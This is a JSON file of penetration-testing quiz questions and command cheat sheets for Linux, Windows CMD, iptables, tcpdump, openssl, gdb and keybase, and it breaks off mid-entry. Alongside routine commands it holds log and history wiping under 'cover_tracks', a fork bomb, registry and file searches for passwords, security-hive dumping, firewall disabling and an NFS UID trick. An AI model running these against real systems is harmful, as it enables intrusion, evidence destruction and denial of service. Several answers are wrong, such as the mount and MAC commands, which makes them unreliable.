{"modules":[{"name":"linux/network","questions":[{"question":"List all udp connections on this machine.","answer":"netstat -lanu"},{"question":"List all TCP connections on this machine.","answer":"netstat -lant"},{"question":"How do you list all established connections?","answer":"lsof -i"},{"question":"How do you access a Windows SMB share at 192.168.0.1?","answer":"smb://192.168.0.1/share"},{"question":"How do you do a domain lookup for ip 1.2.3.4 using host?","answer":"host 1.2.3.4"},{"question":"How do you turn on IP forwarding on a Linux box?","answer":"echo \"1\" > /proc/sys/net/ipv4/ip_forward"},{"question":"How do you do a DNS Zone transfer for IP 1.2.3.4 and domain site.com?","answer":"dig @1.2.3.4 site.com -t AXFR"},{"question":"Add DNS Server 8.8.8.8 to a Linux host?","answer":"echo \"nameserver 8.8.8.8\" > /etc/resolv.conf"},{"question":"Mount a Windows share at 1.2.3.4 on Linux?","answer":"share user 1.2.3.4 c$"},{"question":"Set the default gateway on a linux box to 1.2.3.4 ?","answer":"route add default gw 1.2.3.4"},{"question":"Block the evil IP address 6.6.6.6 on port 8080 on a linux machine.","answer":"tcpkill host 6.6.6.6 and port 8080"},{"question":"What are the 4 steps in a DHCP handshake?","answer":"discover, offer, request, ack"}],"commands":[{"command":"watch ss -tp","comment":"Network connections"},{"command":"netstat -lant","comment":"Tcp connections (-lanu = udp)"},{"command":"lsof -i","comment":"Established connections"},{"command":"smb://<IP>/share","comment":"Access windows SMB share"},{"command":"share user x.x.x.x c$","comment":"Mount Windows Share"},{"command":"smbclient -U user \\\\\\\\<IP>\\\\<SHARE>","comment":"SMB connect"},{"command":"ifconfig eth# <IP>/<CIDR>","comment":"Set IP and netmask"},{"command":"ifconfig eth0:1 <IP>/<CIDR>","comment":"Set Virtual Interface"},{"command":"route add default gw <GW_IP>","comment":"Set Gateway"},{"command":"ifconfig eth# mtu [SIZE]","comment":"Change MTU size"},{"command":"export MAC=xx.xx.xx.xx.xx.xx","comment":"Change MAC"},{"command":"ifconfig <INT> hw ether <MAC>","comment":"Change MAC"},{"command":"macchanger -m <MAC> <INT>","comment":"Kali MAC changer"},{"command":"iwlist <INT> scan","comment":"Built-in Wifi Scanner"},{"command":"dig -x <IP>","comment":"Domain lookup for IP"},{"command":"host <IP>","comment":"Domain lookup for IP"},{"command":"host -t SRV _<SERVICE>_tcp.url.com","comment":"Domain SRV lookup"},{"command":"dig @<IP> domain -t AXFR","comment":"DNS Zone Xfer"},{"command":"host -l <DOMAIN> <NAMESVR>","comment":"DNS Zone Xfer"},{"command":"ip xfrm state list","comment":"Print existing VPN keys"},{"command":"ip addr add <IP>/<CIDR> dev eth0","comment":"Adds 'hidden' interface"},{"command":"/var/log/messages |grep DHCP","comment":"List DHCP assignments"},{"command":"tcpkill host <IP> and port <PORT>","comment":"Block ip:port"},{"command":"echo \"1\" > /proc/sys/net/ipv4/ip_forward","comment":"Turn on IP forwarding"},{"command":"echo \"nameserver x.x.x.x\" > /etc/resolve.conf","comment":"Add DNS server"}],"tags":[{"tag":"networking","none":"non"},{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/system_info","questions":[{"question":"How do you find the hostname for IP 1.2.3.4 using nbtstat/nmblookup?","answer":"nmblookup -A 1.2.3.4"},{"question":"List the current username in linux.","answer":"id"},{"question":"List logged on users.","answer":"w"},{"question":"How do you list mounted file systems on a Linux box?","answer":"mount"},{"question":"How do you show a list of users on the on a Linux box?","answer":"getent passwd"},{"question":"How would you add path /home/mypath to the PATH variable?","answer":"PATH=$PATH:/home/mypath"}],"commands":[{"command":"nmblookup -A <IP>","comment":"Get host name for <IP>"},{"command":"id","comment":"Current Username"},{"command":"w","comment":"Logged on users"},{"command":"who -a","comment":"User information"},{"command":"last -a","comment":"Last users logged on"},{"command":"ps -ef","comment":"Process Listing (top)"},{"command":"df -h","comment":"Disk Usage (free)"},{"command":"uname -a","comment":"Kernel version/CPU info"},{"command":"mount","comment":"Mounted file systems"},{"command":"getent passwd","comment":"Show list of users"},{"command":"PATH=$PATH:/home/mypath","comment":"Add to PATH variable"},{"command":"kill <pid>","comment":"Kill a process by id"},{"command":"cat /etc/issue","comment":"Show OS info"},{"command":"cat /etc/*release*","comment":"Show OS version info"},{"command":"cat /proc/version","comment":"Show kernel info"},{"command":"dpkg -get-selections","comment":"Installed Packages (Ubuntu)"},{"command":"dpkg -I *.deb","comment":"Installed DEB (-r=remove)"},{"command":"which","comment":"Show location of executable"}],"tags":[{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/utility","questions":[{"question":"Grab the URL site.com using wget on linux and save to a file called url.txt","answer":"wget http://site.com -O url.txt -o /dev/null"},{"question":"Connect to 1.2.3.4 via remote desktop on Linux.","answer":"rdesktop 1.2.3.4"},{"question":"Add a user named frank on a Linux machine.","answer":"useradd -m frank"},{"question":"How do you changes user frank's password on Linux?","answer":"passwd frank"},{"question":"How do you remove user frank from Linux?","answer":"rmuser frank"},{"question":"How do you record the shell session to file ~/outfile.txt in linux?","answer":"script -a ~/outfile.txt"},{"question":"Execute line 72 in history in Linux.","answer":"!72"}],"commands":[{"command":"wget http://<url> -O url.txt -o /dev/null","comment":"Grab URL"},{"command":"rdesktop <IP>","comment":"Remote Desktop to <IP>"},{"command":"useradd -m <user>","comment":"Add User"},{"command":"passwd <user>","comment":"Change user password"},{"command":"rmuser <uname>","comment":"Remove user"},{"command":"script -a <outfile>","comment":"Record shell : Ctrl-D stops"},{"command":"history","comment":"View users command history"},{"command":"!<num>","comment":"Executes line # in history"}],"tags":[{"tag":"linux","none":""},{"tag":"utility","none":"add tag basics"},{"tag":"basics","none":""},{"tag":"linux","none":"adsf"}],"platform":""},{"name":"linux/file","questions":[{"question":"How would you diff the files file1.txt and file2.txt?","answer":"diff file1.txt file2.txt"},{"question":"How would you create a file called newfile.txt that would have the timestamp of the file oldfile.txt?","answer":"touch -r oldfile.txt newfile.txt"},{"question":"Change the file file.txt to have timestamp of Oct, 22. 2017 at 06:22 am?","answer":"touch -t 201710220622 file.txt"},{"question":"There are two types of partion tables in linux. 1.) MBR and 2.) ...?","answer":"GPT"},{"question":"After partitioning a disk (sdb2), how do you create an ext4 filesystem in it?","answer":"mkfs -t ext4 /dev/sdb2"},{"question":"Get a list of filesystems mounted in Linux.","answer":"cat /etc/fstab"},{"question":"Check how many inodes are left on your Linux system.","answer":"df -i"}],"commands":[{"command":"diff file1 file2","comment":"Compare Files"},{"command":"rm -rf <dir>","comment":"Force delete <dir>"},{"command":"shred -f -u <file>","comment":"Overwrite/delete file"},{"command":"touch -r <ref_file> <file>","comment":"Matches ref_file timestamp"},{"command":"touch -t YYYYMMDDHHSS <file>","comment":"Set file timestamp"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"file","none":"asdf"}],"platform":""},{"name":"linux/misc","questions":[{"question":"How to disable history logging on a linux machine?","answer":"unset HISTFILE"},{"question":"How would you compile a file called file.c to a file called outfile using gcc?","answer":"gcc -o outfile file.c"},{"question":"How would you make a random 3MB file in linux called newfile?","answer":"dd if=/dev/urandom of=newfile bs=3145728 count=100"},{"question":"How do you cut the 3rd field in file.txt in Linux?","answer":"cut -f 3 file.txt"},{"question":"How do you merge all lines in file.txt in linux?","answer":"paste -s file.txt"},{"question":"How do you convert tabs to spaces in file.txt in Linux?","answer":"expand file.txt"},{"question":"How do you convert spaces to tabs in file.txt in Linux?","answer":"unexpand -a file.txt"},{"question":"How do you joine file1.txt and file2.txt in linux by field 2 in file 1, and field 1 in file two; because their fields don't match in Linux?","answer":"join -1 2 -2 1 file1.txt file2.txt"},{"question":"How do you translate a set of characters \"hello\" from lowercase to uppercase in Linux?","answer":"tr a-z A-Z hello"},{"question":"How do you get unique values from file.txt in Linux?","answer":"uniq -u file.txt"}],"commands":[{"command":"unset HISTFILE","comment":"Disable history logging"},{"command":"gcc -o outfile myfile.c","comment":"Compile C,C++ with gcc"},{"command":"grep 'href=' <FILE> |cut -d\"/\" -f3 |grep <URL> |sort -u","comment":"Strip links in url.com"},{"command":"dd if=/dev/urandom of=<FILE> bs=3145728 count=100","comment":"Make random 3MB file"}],"tags":[{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/cover_tracks","questions":[{"question":"How would you clear the auth.log file on a Linux Box?","answer":"echo \"\" > /var/log/auth.log"},{"question":"How would you clear the current user bash history in Linux?","answer":"echo \"\" > ~/.bash_history"},{"question":"How would you clear session history in Linux?","answer":"history -c"},{"question":"How would you disable history logging in linux?","answer":"unset HISTFILE"}],"commands":[{"command":"echo \"\" > /var/log/auth.log","comment":"Clear auth.log file"},{"command":"echo \"\" > ~/.bash_history","comment":"Clear current user bash history"},{"command":"rm -rf ~/.bash_history","comment":"Delete bash history file"},{"command":"history -c","comment":"Clear current session history"},{"command":"export HISTFILESIZE=0","comment":"Set history max lines to zero"},{"command":"export HISTSIZE=0","comment":"Set history max commands to 0"},{"command":"unset HISTFILE","comment":"Disable history logging (need to logout to take effect)"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"hacking","none":"asdf"},{"tag":"pentest","none":"asdf"},{"tag":"hiding","none":"asdf"},{"tag":"persistence","none":"asdf"}],"platform":""},{"name":"linux/hack_scripting","questions":[{"question":"How would you fork bomb linux?","answer":":(){:|: &};:"},{"question":"How would one do a ping sweep for the 192.168.0.1/24 network?","answer":"for x in {1..254..1};do ping -c 1 192.168.0.$x"}],"commands":[{"command":":(){:|: &};:","comment":"Fork Bomb"},{"command":"for x in {1..254..1};do ping -c 1 1.1.1.$x","comment":"Ping Sweep"}],"tags":[{"tag":"linux","none":"adsf"},{"tag":"hacking","none":"asdf"},{"tag":"script","none":"asdf"}],"platform":""},{"name":"linux/iptables","questions":[{"question":"How would you dump iptables rules to a file called newfile?","answer":"iptables-save -c > newfile"},{"question":"How would you restore iptables rules from file newfile?","answer":"iptables-restore newfile"},{"question":"How would you flush all iptables rules?","answer":"iptables -F"},{"question":"How would you delete the 7th inbound rule in iptables?","answer":"iptables -D INPUT 7"},{"question":"How would you drop all packets in iptables?","answer":"iptables -P INPUT DROP"}],"commands":[{"command":"iptables-save -c > <FILE>","comment":"Dump iptables (with counters) rules to stdout"},{"command":"iptables-restore <FILE>","comment":"Restore iptables rules"},{"command":"iptables -L -v --line-numbers","comment":"List all iptables rules with affected and line numbers"},{"command":"iptables -F","comment":"Flush all iptables rules"},{"command":"iptables -P <INPUT/FORWARD/OUTPUT> <ACCEPT/REJECT/DROP>","comment":"Change default policy for rules that don't match rules"},{"command":"iptables -D INPUT 7","comment":"Delete 7th Inbound rule"},{"command":"iptables -t raw -L -n","comment":"Increase throughput by turning off statefulness"},{"command":"iptables -P INPUT DROP","comment":"Drop all packets"},{"command":"iptables -A INPUT -i <interface> -m state --state RELATED,ESTABLISHED -j ACCEPT","comment":"Allow established connections on INPUT"},{"command":"iptables -A OUTPUT -o <iface> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT","comment":"Establish outbound rule for ssh on port 22 in iptables"},{"command":"iptable -A INPUT -i <iface> -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT","comment":"Establish inbound connection for outbound ssh on port 22 in iptables"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"firewall","none":"asdf"},{"tag":"iptables","none":"asdf"},{"tag":"pivoting","none":"asdf"}],"platform":""},{"name":"networking/tcpdump","questions":[{"question":"How do you capture only 7 packets from device eth0?","answer":"tcpdump -c 7 -i eth0"},{"question":"How do you capture traffic from device eth0 in ASCII and HEX, using tcpdump?","answer":"tcpdump -XX -i eth0"},{"question":"How do you read the pcap file file.pcap using tcpdump?","answer":"tcpdump -r file.pcap"},{"question":"How do you write a packet capture to a file called file.pcap, listening on device eth0, using tcpdump?","answer":"tcpdump -w file.pcap -i eth0"},{"question":"How do you capture only IP packets on eth0 using tcpdump?","answer":"tcpdump -n -i eth0"},{"question":"How would you capture only tcp packets on eth0 using tcpdump?","answer":"tcpdump -i eth0 tcp"}],"commands":[{"command":"tcpdump -i eth0","comment":"Listen to all packets on device eth0"},{"command":"tcpdump -c 5 -i eth0","comment":"Capture 5 packets from device eth0"},{"command":"tcpdump -A -i eth0","comment":"Listen to all packets from eth0 and print as ASCII"},{"command":"tcpdump -D","comment":"Display available interfaces"},{"command":"tcpdump -XX -i eth0","comment":"Display all packets in HEX and ASCII"},{"command":"tcpdump -w file.pcap -i eth0","comment":"Write all captured packets to a file"},{"command":"tcpdump -r savedcap.pcap","comment":"Read captured packets file"},{"command":"tcpdump -n -i eth0","comment":"Capture IP address packets"},{"command":"tcpdump -i eth0 tcp","comment":"Capture only tcp packets"},{"command":"tcpdump -i eth0 port 22","comment":"Capture packets from only port 22"},{"command":"tcpdump -i eth0 src 1.2.3.4","comment":"Capture packets from source IP 1.2.3.4"}],"tags":[],"platform":""},{"name":"windows/cmd/system_info","questions":[{"question":"How do you get the windows OS version in CMD?","answer":"ver"},{"question":"List all Windows services in CMD terminal.","answer":"sc query state=all"},{"question":"How do you list Windows processes and services using CMD?","answer":"tasklist /svc"},{"question":"How do you list Windows prcesses and DLLs using CMD?","answer":"tasklist /m"},{"question":"How would you search the Windows registry for passwords?","answer":"reg query HKLM /f password /t REG_SZ /s"},{"question":"How would you list Windows Drives using CMD?","answer":"fsutil fsinfo drives"},{"question":"Search a Windows machine for pdf files using CMD?","answer":"dir /a /s /b c:\\*.pdf*"},{"question":"Save Windows security hive to file.","answer":"reg save HKLM\\Security security.hive"},{"question":"Print current user in Windows using CMD","answer":"echo %USERNAME%"}],"commands":[{"command":"ver","comment":"Get OS Version"},{"command":"sc query state=all","comment":"Get services"},{"command":"tasklist /svc","comment":"Show processes and services"},{"command":"tasklist /m","comment":"Show all processes and DLLs"},{"command":"tasklist /S <IP> /v","comment":"Remote process listing for IP"},{"command":"taskkill /PID <PID> /F","comment":"Kill a PID"},{"command":"systeminfo /S <IP> /U domain\\user /P <pwd>","comment":"Remote Sytem info"},{"command":"req query \\\\<IP>\\<RegDomain>\\<Key> /v","comment":"Query remote registry"},{"command":"reg query HKLM /f password /t REG_SZ /s","comment":"Search registry for passwords"},{"command":"fsutil fsinfo drives","comment":"List drives \"must be admin\""},{"command":"dir /a /s /b c:\\*.pdf*","comment":"Search for all pdfs"},{"command":"findstr /si password *.txt| *.xml| *.xls","comment":"Searches for password in specific file types"},{"command":"reg save HKLM\\Security security.hive","comment":"Save security hive to file"},{"command":"echo %USERNAME%","comment":"Current user"}],"tags":[],"platform":""},{"name":"windows/cmd/net_domain","questions":[{"question":"How would you list Hosts in a current domain in Windows via CMD?","answer":"net view /domain"},{"question":"List the hosts in MYDOMAIN in Windows via CMD.","answer":"net view /domain:MYDOMAIN"},{"question":"How do you list all users in a domain in Windows via CMD?","answer":"net user /domain"},{"question":"How do you add user frank with password 'password' to a Windows account via CMD?","answer":"net user frank password /add"},{"question":"How do you add user frank to the local Admin group on a Windows box via CMD?","answer":"net localgroup \"Administrators\" frank /add"},{"question":"List the domain password policy in Windows via CMD.","answer":"net accounts /domain"},{"question":"List the local Windows Adminstrators group in CMD.","answer":"net localgroup \"Administrators\""},{"question":"How do you list the domain groups in Windows via CMD?","answer":"net group /domain"},{"question":"How do you list users in \"Domain Admins\" group on a Windows domain via CMD?","answer":"net group \"Domain Admins\" /domain"},{"question":"List current SMB shares in Windows via CMD.","answer":"net share"},{"question":"How would you chage domain user frank's password in Windows to 'password' via CMD?","answer":"net user frank \"password\" /domain"},{"question":"How would you unlock domain user frank's account in Windows using CMD?","answer":"net user frank /ACTIVE:yes /domain"}],"commands":[{"command":"net view /domain","comment":"Hosts in current domain"},{"command":"net view /domain:[MYDOMAIN]","comment":"Hosts in [MYDOMAIN]"},{"command":"net user /domain","comment":"All users in current domain"},{"command":"net user <user> <pass> /add","comment":"Add user"},{"command":"net localgroup \"Administrators\" <user> /add","comment":"Add user to local administrators"},{"command":"net accounts /domain","comment":"Domain password policy"},{"command":"net localgroup \"Administrators\"","comment":"Local admins"},{"command":"net group /domain","comment":"List domain groups"},{"command":"net group \"Domain Admins\" /domain","comment":"List users in Domain Admins"},{"command":"net group \"Domain Controllers\" /domain","comment":"List DCs for current domain"},{"command":"net share","comment":"List current SMB shares"},{"command":"net user <user> \"<newpassword>\" /domain","comment":"Change domain user password"},{"command":"net user <user> /ACTIVE:yes /domain","comment":"Unlock domain user account"},{"command":"net share <share> C:\\share /GRANT:Everyone,FULL","comment":"Share folder"}],"tags":[{"tag":"windows","none":"asdf"},{"tag":"domain","none":"asdf"}],"platform":""},{"name":"windows/cmd/network","questions":[{"question":"List local DNS cache on Windows using CMD","answer":"ipconfig /displaydns"},{"question":"List all listening ports in Windows using CMD.","answer":"netstat -an| findstr LISTENING"},{"question":"Print routing table in Windows using CMD.","answer":"route print"},{"question":"View the ARP table in Windows using CMD.","answer":"arp -a"},{"question":"How would you sniff network traffic in Windows and store the output to a file c:\\temp\\nettrace-boot.etl?","answer":"netsh trace start persistent=yes capture=yes tracefile=c:\\temp\\nettrace-boot.etl"},{"question":"How do you set an IP address to 1.2.3.4 with gateway 1.2.3.0, id 2, and netmask of 255.255.255.0 in Windows via CMD?","answer":"netsh interface ip set address local static 1.2.3.4 255.255.255.0 1.2.3.0 2"},{"question":"How would you set a DNS server of 8.8.8.8 in Windows via CMD?","answer":"netsh interface ip set dns local static 8.8.8.8"},{"question":"How would in set an interface to user DHCP in Windows via CMD?","answer":"netsh interface ip set address local dhcp"}],"commands":[{"command":"ipconfig /all","comment":"IP configuration"},{"command":"ipconfig /displaydns","comment":"Local DNS cache"},{"command":"netstat -an| findstr LISTENING","comment":"LISTENING Ports"},{"command":"route print","comment":"Routing Table"},{"command":"arp -a","comment":"ARP table"},{"command":"nslookup set type=any, ls -d domain > results.txt, exit.","comment":"DNS Zone Xfer"},{"command":"netsh interface ip show interfaces","comment":"List interfaces IDs/MTUs"},{"command":"netsh interface ip set address local static <IP> <NETMASK> <GW> <ID>","comment":"Set IP"},{"command":"netsh interface ip set dns local static <IP>","comment":"Set DNS server"},{"command":"netsh interface ip set address local dhcp","comment":"Set interface to user DHCP"},{"command":"netsh trace start persistent=yes capture=yes tracefile=c:\\temp\\nettrace-boot.etl","comment":"A network trace/capture"}],"tags":[],"platform":""},{"name":"windows/cmd/utility","questions":[{"question":"How do you display the contents of the file 'newfile' in Windows using CMD?","answer":"type newfile"},{"question":"Delete all files in path c:\\temp\\ in Windows using CMD.","answer":"del c:\\temp\\*.* /a /s /q /f"},{"question":"How do you find the string \"hello\" in the file test.txt in Windows using CMD?","answer":"find /I \"hello\" test.txt"},{"question":"How do you run 'cmd /c' as the user tyler in Windows via CMD?","answer":"runas /user:tyler \"cmd /c\""},{"question":"How do you uninstall the patch kb 1234 in Windows via CMD?","answer":"Wusa.exe /uninstall /kb:1234"}],"commands":[{"command":"type <FILE>","comment":"Display file contents"},{"command":"del <PATH>\\*.* /a /s /q /f","comment":"Forcably delete all files in PATH"},{"command":"find /I \"str\" <FILENAME>","comment":"Find \"str\""},{"command":"<command> | find /c /v \"\"","comment":"Line count of <cmd> output"},{"command":"runas /user:<USER> \"<file> [args]\"","comment":"Run <file> as <USER>"},{"command":"tr -d '\\15\\32' < win.txt > unix.txt","comment":"Remove CR & ^Z (*nix)"},{"command":"makecab <file>","comment":"Native Compression"},{"command":"Wusa.exe /uninstall /kb:<####>","comment":"Uninstall Patch"},{"command":"cmd.exe \"wevtutil qe Application /c:40 /f:text /rd:true\"","comment":"CLI Event Viewer"},{"command":"lusrmgr.msc","comment":"Local user manager"},{"command":"services.msc","comment":"Services control pane"},{"command":"taskmgr.exe","comment":"Task manager"},{"command":"secpool.msc","comment":"Security Policy manager"},{"command":"eventvwr.msc","comment":"Event Viewer"}],"tags":[],"platform":""},{"name":"windows/dsc","questions":[{"question":"How do you force DSC to update in windows?","answer":"Start-DscConfiguration -useexisting -wait -verbose"}],"commands":[{"command":"Start-DscConfiguration -useexisting -wait -verbose","comment":"Force the DSC to update"}],"tags":[],"platform":""},{"name":"windows/firewall","questions":[{"question":"How would you disable the Windows Firewall for the current profile?","answer":"netsh advfirewall set currentprofile state off"},{"question":"How would you disable the Windows Firewall for all profiles?","answer":"netsh advfirewall set allprofiles state off"}],"commands":[{"command":"netsh advfirewall set currentprofile state off","comment":"Disable the firewall for the current profile"},{"command":"netsh advfirewall set allprofiles state off","comment":"Disable the firewall for all profiles"}],"tags":[],"platform":""},{"name":"windows/powershell/basic","questions":[{"question":"Search for Powershell commands with keyword 'domain'","answer":"Get-Command *domain*"},{"question":"How do you display services using Windows Powershell?","answer":"Get-Service"},{"question":"How do you display powershell version?","answer":"$PSVersionTable"},{"question":"Open powershell version 2 from a different version of powershell","answer":"powershell.exe -version 2.0"},{"question":"How do you list processes (name only) in Windows Powershell?","answer":"Get-Process | select -expandproperty name"},{"question":"How do you get a list of drives in Powershell?","answer":"get-psdrive"},{"question":"How do you get the number of services using Windows Powershell?","answer":"get-service | measure-object"}],"commands":[{"command":"get-content <FILE>","comment":"Display File contents"},{"command":"get-help <COMMAND> -examples","comment":"Shows examples of <COMMAND>"},{"command":"get-command *<string>*","comment":"Searches for command <string>"},{"command":"get-service","comment":"Displays services (also stop-service and start-service)"},{"command":"$PSVersionTable","comment":"Display powershell version"},{"command":"powershell.exe -version 2.0","comment":"Open powershell version 2 (from other ps versions)"},{"command":"Get-Process | select -expandproperty name","comment":"Get processes (names only)"},{"command":"get-psdrive","comment":"Returns list of PSDrives"},{"command":"get-service | measure-object","comment":"Returns # if services"},{"command":"get-help * -parameter credential","comment":"Cmdlet that take cred"}],"tags":[],"platform":""},{"name":"linux/hack/nfs","questions":[{"question":"Check to see if there are NFS services running on 1.2.3.4 from a Linux terminal.","answer":"rpcinfo -p 1.2.3.4"},{"question":"Retrieve a list of exported folders on NFS share at 1.2.3.4, in Linux.","answer":"showmount -e 1.2.3.4"},{"question":"List directories of open NFS share at 1.2.3.4 using linux.","answer":"showmount -d 1.2.3.4"},{"question":"List mount points at NFS share at 1.2.3.4 using Linux","answer":"showmount -a 1.2.3.4"},{"question":"Mount the remote NFS share at 1.2.3.4 in the local dir /tempdir","answer":"mount -t nfs 1.2.3.4:/ /tempdir -o nolock"}],"commands":[{"command":"rpcinfo -p <IP>","comment":"Determine if any mountd and NFS services running on host"},{"command":"showmount -e <IP>","comment":"Retrieve list of exported folders for a given host."},{"command":"showmount IP","comment":"Show connected hosts for NFS"},{"command":"showmount -d <IP>","comment":"Show directories"},{"command":"showmount -a <IP>","comment":"Show Mount Points"},{"command":"mount -t nfs 1.2.3.4:/ /tempdir -o nolock","comment":"Accessing exported NFS files by creating empty 'tempdir' and mounting the share to thsi."},{"command":"1.) Add username. 2.) Edit and change UID and GUID in /etc/passwd file","comment":"Try and trick UID of mounted file system if \"root_squash\" isn't enables for the NFS mount. "},{"command":"nano /etc/exports","comment":"File to edit to add either root_squash or no_root_squash"}],"tags":[],"platform":""},{"name":"crypto/openssl","questions":[{"question":"Create a 2048 bit private key domain.key and CSR domain.csr from scratch.","answer":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr"},{"question":"Generate CSR domain.csr from existing Private Key domain.key","answer":"openssl req -key domain.key -new -out domain.csr"},{"question":"Generate CSR domain.csr from existing Certificate domain.crt and Private Key domain.key","answer":"openssl x509 -in domain.crt -signkey domain.key -x509toreq -out domain.csr"},{"question":"Generate a self-signed certificate domain.crt and key domain.key","answer":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -x509 -days 365 -out domain.crt"},{"question":"Generate self-signed cert domain.crt from Existing Private Key domain.key","answer":"openssl req -key domain.key -new -x509 -days 365 -out domain.crt"},{"question":"Generate self-signed cert domain.crt from existing private key domain.key, and CSR domain.csr","answer":"openssl x509 -signkey domain.key -in domain.csr -req -days 365 -out domain.crt"},{"question":"How do you verify that a cert domain.crt was signed by the CA cert ca.crt?","answer":"openssl verify -verbose -CAFile ca.crt domain.crt"},{"question":"How do you create a private key domain.key via OpenSSL?","answer":"openssl rsa -des3 -out domain.key 2048"},{"question":"How do you encrypte a private key with OpenSSL?","answer":"openssl rsa -des3 -in unencrypted.key -out encrypted.key"},{"question":"How do you decrypt a private key with OpenSSL?","answer":"openssl rsa -in encrypted.key -out decrypted.key"},{"question":"Convert a PEM cert domain.crt to DER cert domain.der","answer":"openssl x509 -in domain.crt -outform der -out domain.der"},{"question":"Convert a DER cert domain.der to PEM cert domain.crt","answer":"openssl x509 -inform der -in domain.der -out domain.crt"},{"question":"How do you get TLS certificate info from 1.2.3.4 on port 443 using openssl?","answer":"openssl s_client -connect 1.2.3.4:443"}],"commands":[{"command":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr","comment":"Create 2048 bit private key and CSR from scratch"},{"command":"openssl req -key domain.key -new -out domain.csr","comment":"Generate CSR from existing Private Key"},{"command":"openssl x509 -in domain.crt -signkey domain.key -x509toreq -out domain.csr","comment":"Generate CSR from existing Certificate and Private Key"},{"command":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -x509 -days 365 -out domain.crt","comment":"Generate self-signed Certificate"},{"command":"openssl req -key domain.key -new -x509 -days 365 -out domain.crt","comment":"Generate self-signed cert from Existing Private Key"},{"command":"openssl x509 -signkey domain.key -in domain.csr -req -days 365 -out domain.crt","comment":"Generate Self-Signed Cert from existing Private Key and CSR"},{"command":"openssl x509 -text -noout -in domain.crt","comment":"View Cert entries"},{"command":"openssl verify -verbose -CAFile ca.crt domain.crt","comment":"Verify A cert was Signed by a CA"},{"command":"openssl genrsa -des3 -out domain.key 2048","comment":"Create a Private Key"},{"command":"openssl rsa -check -in domain.key","comment":"Verify that a private key is a valid key. If encrypted, you will be prompted for password."},{"command":"openssl rsa -des3 -in unencrypted.key -out encrypted.key","comment":"Encrypt a Private Key"},{"command":"openssl rsa -in encrypted.key -out decrypted.key","comment":"Decrypt A Private Key"},{"command":"open x509 -in domain.crt -outform der -out domain.der","comment":"Convert PEM to DER"},{"command":"openssl x509 -inform der -in domain.der -out domain.crt","comment":"Convert DER to PEM"},{"command":"openssl pkcs7 -in domain.p7b -print_certs -out domain.crt","comment":"Convert PKCS7 to PEM"},{"command":"openssl pkcs12 -inkey domain.key -in domain.crt -export -out domain.pfx","comment":"Convert PEM to PKCS12"},{"command":"openssl pkcs12 -in domain.pfx -nodes -out domain.combined.crt","comment":"Convert PKCS12 to PEM"},{"command":"openssl s_client -connect 1.2.3.4:443","comment":"Grab certificate information"}],"tags":[],"platform":""},{"name":"linux/gdb","questions":[{"question":"How do you run executable /bin/bash with argument 'test' using gdb?","answer":"gdb --args /bin/bash test"},{"question":"Set a breakpoint at the main function using GDB","answer":"break main"},{"question":"Set a breakpoint at address 0x12345678 in GDB","answer":"break *0x12345678"},{"question":"Disassemble the function main with GDB","answer":"disassemble main"},{"question":"Show the registers with GDB","answer":"info registers"},{"question":"Show the register 'eip' using GDB","answer":"info registers eip"},{"question":"How do you show a backtrace with local variables in GDB?","answer":"bt full"},{"question":"Examine the hex value of the eip register using GDB","answer":"x/x $eip"},{"question":"How to you step to the next instruction in GDB?","answer":"nexti"},{"question":"How do you find the address of function foo in GDB?","answer":"info address foo"},{"question":"How do you specify to user Intel Syntax in GDB?","answer":"set dis intel"},{"question":"How do you compile file.c to 'outfile' with debugging options in GCC?","answer":"gcc -g -m32 -o outfile file.c"},{"question":"How do you show the source of a binary in GDB if it was compiled with the -g flag?","answer":"list"}],"commands":[{"command":"gdb --args /path/to/executable -args -moreargs","comment":"Run an executable with arguments"},{"command":"break main","comment":"Set a breakpoint"},{"command":"b *0x8080808","comment":"Set a breakpoint at an instruction (address)"},{"command":"disassemble main","comment":"Disassemble a funciton"},{"command":"info registers (ir)","comment":"Show registers"},{"command":"info registers eip (i r eip)","comment":"Show specific register"},{"command":"bt full","comment":"Show a backtrace with local variables"},{"command":"x/x $eip","comment":"View the value of a register"},{"command":"nexti (ni)","comment":"Next instruction"},{"command":"info address foo","comment":"Find a function address"},{"command":"set dis intel","comment":"Use Intel syntax"},{"command":"gcc -g -m32 -o outfile file.c","comment":"GCC compile with debugging options for x86"},{"command":"list","comment":"Show source for binary if compiled with -g flag"},{"command":"ulimit -c unlimited","comment":"Generate core dump on segfault"}],"tags":[],"platform":""},{"name":"crypto/keybase","questions":[{"question":"Prove a twitter account using keybase","answer":"keybase prove twitter"},{"question":"How do you lookup keybase user Tim?","answer":"keybase id Tim"},{"question":"How do you follow keybase user frank?","answer":"keybase follow frank"},{"question":"Encrypt message \"hello\" for keybase user joe.","answer":"keybase encrypt joe -m \"hello\""},{"question":"List all devices and paper keys for keybase","answer":"keybase device list"},{"question":"How do you add a device in keybase?","answer":"keybase device add"},{"question":"How do you make a new paperkey in keybase?","answer":"keybase paperkey"},{"question":"Encrypt file.mov for user joe in keybase.","answer":"keybase encrypt joe -i file.mov -o file.mov.encrypted"},{"question":"How do you sign an executable file test.exe in keybase?","answer":"keybase sign -i test.exe -b -o test.exe.signed"},{"question":"How do you sign a PGP message \"hello\" but don't encode the contents in keybase?","answer":"keybase pgp sign --clearsign -m \"hello\""},{"question":"Verify a PGP signed file test.txt in keybase?","answer":"keybase pgp verify -i test.txt"}],"commands":[{"command":"keybase help","comment":"Help"},{"command":"keybase version","comment":"Version"},{"command":"keybase login","comment":"Login"},{"command":"keybase prove <service>","comment":"Prove an account (twitter, github, etc.)"},{"command":"keybase search <user>","comment":"Find a keybase user"},{"command":"keybase id <user>","comment":"Look up user, verify identity"},{"command":"keybase id <user>@twitter","comment":"Look twitter (or other service) user up"},{"command":"keybase follow <user>","comment":"Track user identidy publicly"},{"command":"keybase follow <user>@reddit","comment":"Follow a reddit (or other service) user"},{"command":"keybase encrypt <user> -m \"secret message\"","comment":"Encrypt a messae for user if you \"follow\" them"},{"command":"keybase device list","comment":"List all devices and paper keys"},{"command":"keybase device remove 